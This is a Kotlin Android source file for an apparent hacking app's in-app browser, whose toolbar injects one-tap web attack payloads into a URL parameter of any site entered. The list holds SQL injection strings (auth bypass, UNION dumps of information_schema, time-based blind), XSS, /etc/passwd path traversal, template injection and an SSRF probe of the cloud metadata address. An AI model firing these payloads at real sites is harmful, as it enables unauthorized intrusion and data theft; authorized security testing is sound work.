package self.apk.sickhack.genz.ui.screens

import android.annotation.SuppressLint
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowBack
import androidx.compose.material.icons.filled.Refresh
import androidx.compose.material.icons.filled.Send
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import self.apk.sickhack.genz.core.scanner.Scanner
import self.apk.sickhack.genz.ui.components.Pill
import self.apk.sickhack.genz.ui.components.TInput
import self.apk.sickhack.genz.ui.theme.BlackBg
import self.apk.sickhack.genz.ui.theme.SurfaceHigh
import self.apk.sickhack.genz.ui.theme.TerminalGreen
import self.apk.sickhack.genz.ui.theme.TerminalGreenDim

private data class MethodTool(val name: String, val payload: String)

private val METHOD_TOOLS = listOf(
    MethodTool("Union", "' UNION SELECT 1,2,3-- -"),
    MethodTool("OrderBy", "' ORDER BY 5-- -"),
    MethodTool("Auth", "' OR '1'='1'-- -"),
    MethodTool("Error", "' AND extractvalue(1,concat(0x7e,(select version())))-- -"),
    MethodTool("Blind", "' AND SLEEP(5)-- -"),
    MethodTool("DIOS", "' UNION SELECT null,group_concat(table_name) FROM information_schema.tables-- -"),
    MethodTool("WAF", "<script>alert(1)</script>"),
    MethodTool("XSS", "<img src=x onerror=alert(1)>"),
    MethodTool("LFI", "../../../../etc/passwd"),
    MethodTool("SSTI", "{{7*7}}"),
    MethodTool("SSRF", "http://169.254.169.254/latest/meta-data/"),
    MethodTool("Encode", "%3Cscript%3Ealert(1)%3C%2Fscript%3E")
)

@SuppressLint("SetJavaScriptEnabled")
@Composable
fun BrowserScreen(onBack: () -> Unit) {
    val context = LocalContext.current
    var urlText by rememberSaveable { mutableStateOf("https://example.com") }
    var loadUrl by remember { mutableStateOf("https://example.com") }
    var status by remember { mutableStateOf("// ready") }

    val webView = remember {
        WebView(context).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.loadWithOverviewMode = true
            settings.useWideViewPort = true
            webChromeClient = WebChromeClient()
            webViewClient = object : WebViewClient() {
                override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                    return false
                }
            }
        }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(BlackBg)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .background(SurfaceHigh)
                .border(1.dp, TerminalGreenDim.copy(alpha = 0.4f))
                .padding(horizontal = 4.dp, vertical = 8.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            IconButton(onClick = onBack) {
                Icon(Icons.Filled.ArrowBack, contentDescription = "Back", tint = TerminalGreen)
            }
            Text("BROWSER", color = TerminalGreen, fontSize = 15.sp, fontWeight = FontWeight.Bold, maxLines = 1, overflow = TextOverflow.Ellipsis)
            Spacer(Modifier.width(6.dp))
            IconButton(onClick = { loadUrl = urlText; webView.loadUrl(urlText) }) {
                Icon(Icons.Filled.Refresh, contentDescription = "Reload", tint = TerminalGreen)
            }
        }

        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 8.dp, vertical = 6.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Box(Modifier.weight(1f)) {
                TInput(
                    value = urlText,
                    onValueChange = { urlText = it },
                    label = "url"
                )
            }
            IconButton(
                onClick = {
                    val u = urlText.trim()
                    if (u.isNotEmpty()) {
                        loadUrl = u
                        webView.loadUrl(u)
                    }
                }
            ) {
                Icon(Icons.Filled.Send, contentDescription = "Go", tint = TerminalGreen)
            }
        }

        // Method toolbar: sekali tekan -> inject payload ke URL & reload
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .horizontalScroll(rememberScrollState())
                .padding(horizontal = 8.dp),
            horizontalArrangement = Arrangement.spacedBy(6.dp)
        ) {
            METHOD_TOOLS.forEach { tool ->
                Pill(
                    text = tool.name,
                    color = TerminalGreen,
                    onClick = {
                        val injected = Scanner.injectParam(urlText, "sickhack", tool.payload)
                        urlText = injected
                        loadUrl = injected
                        webView.loadUrl(injected)
                        status = "// ${tool.name}: ${tool.payload.take(60)}"
                    }
                )
            }
        }

        Text(
            text = status,
            color = TerminalGreen,
            fontSize = 10.sp,
            modifier = Modifier.padding(horizontal = 8.dp, vertical = 2.dp),
            maxLines = 1,
            overflow = TextOverflow.Ellipsis
        )

        AndroidView(
            factory = { webView },
            modifier = Modifier
                .fillMaxWidth()
                .weight(1f)
                .padding(horizontal = 8.dp)
                .border(1.dp, TerminalGreenDim.copy(alpha = 0.4f))
        )
    }
}
